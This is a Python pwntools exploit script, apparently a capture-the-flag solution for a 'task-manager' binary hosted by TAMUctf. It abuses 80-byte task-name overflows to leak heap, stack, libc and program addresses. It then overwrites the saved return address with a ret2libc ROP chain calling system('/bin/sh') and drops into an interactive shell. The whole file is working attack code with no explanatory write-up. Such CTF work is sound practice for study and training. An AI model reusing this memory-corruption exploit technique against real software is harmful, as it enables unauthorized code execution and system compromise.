#!/usr/bin/env python3
from pwn import *

# PORT = 0000
# HOST = "000000000"
exe = context.binary = ELF('./task-manager_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*main+737
        	b*main+403
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote("streams.tamuctf.com", 443, ssl=True, sni="task-manager")
else:
    p = exe.process()

# GDB()

name = b"d1nhdwc"
p.sendafter(b"characters): ", name)

def option(sel):
	p.sendlineafter(b"input: ", str(sel))

def add(pl):
	p.sendlineafter(b"input: ", str(1))
	p.sendafter(b"characters): ", pl)

# STAGE 1: Leak heap, stack, libc, exe

pl = b"A"*80
add(pl)
p.recvuntil(pl)
heap_leak = u64(p.recv(6) + b"\0\0")
task_head = heap_leak - 0xc0
log.info("task_head: " + hex(task_head))

pl = flat(b'B'*80, task_head)
add(pl)

add(b"C"*8)
p.recvuntil(b"C"*8)
stack_leak = u64(p.recv(6) + b"\0\0")
saved_rbp = stack_leak + 0xa8
log.info("stack_leak: " + hex(stack_leak))
log.info("saved_rbp: " + hex(saved_rbp))

pl = flat(b'D'*80, saved_rbp)
add(pl)

add(b'E'*8)
p.recvuntil(b"E"*8)
libc_leak = u64(p.recv(6) + b"\0\0")
libc.address = libc_leak - 0x2724a
log.info("libc_base: " + hex(libc.address))

pl = flat(b'F'*80, saved_rbp+0x10)
add(pl)

add(b"G"*8)
p.recvuntil(b"G"*8)
exe.address = u64(p.recv(6) + b"\0\0") - 0x1231
log.info("exe_base: " + hex(exe.address))

# STAGE 2: ret2libc and exit the program to get shell
# GDB()
pl = flat(b'H'*80, saved_rbp+0x8)  #saved_rip
add(pl)
ret = exe.address + 0x0000000000001016
pop_rdi = libc.address + 0x00000000000277e5
bin_sh = next(libc.search("/bin/sh\0"))
system = libc.sym.system

rop = flat(
    ret, pop_rdi, bin_sh, system
    )
rop = flat(
    rop.ljust(0x48, b'I'),
    task_head + 0x240,
    exe.sym.size
    )
add(rop)

sizepl = p64(0x0)
sizepl = sizepl.ljust(0x58)
add(sizepl)
option(5)

p.interactive()
